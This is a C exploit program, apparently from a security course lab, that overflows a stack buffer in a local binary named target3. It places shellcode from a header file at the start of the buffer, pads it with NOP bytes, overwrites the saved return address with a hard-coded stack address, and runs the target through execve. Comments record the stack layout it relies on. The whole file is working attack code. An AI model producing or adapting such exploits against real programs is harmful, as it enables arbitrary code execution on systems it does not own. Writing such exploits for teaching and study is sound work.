#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"


// foo
// rbp at 0x3021fe90
// rip at 0x3021fe98

// buf begin at 0x3021fe50 + atk_buf at fe54
// buf ends at 0x3021fe90
// buf length 64 --> 40 in hex

// bar
// rbp at 0x3021fe30
// rip at 0x3021fe38
// len at 0x3021de0c
// ltarg at 0x3021fe2c

// attack at foo's return

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	int buf_size = 68 + 4 + 1; // 73
	char atk_buf[buf_size];
	int shell_length = strlen(shellcode);


	// place the shellcode at the beginning of the buffer
	for(int i = 0; i < shell_length; i++){
		atk_buf[i] = shellcode[i];
	}

	for(int i = shell_length; i < buf_size; i++){
		atk_buf[i] = '\x90';
	}

	// buf begin at 0x3021fe50 but return at fe54 due to AAAA
	atk_buf[68] = '\x54';
	atk_buf[69] = '\xfe';
	atk_buf[70] = '\x21';
	atk_buf[71] = '\x30';
	atk_buf[72] = '\0';


	args[0] = TARGET;
	args[1] = atk_buf;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
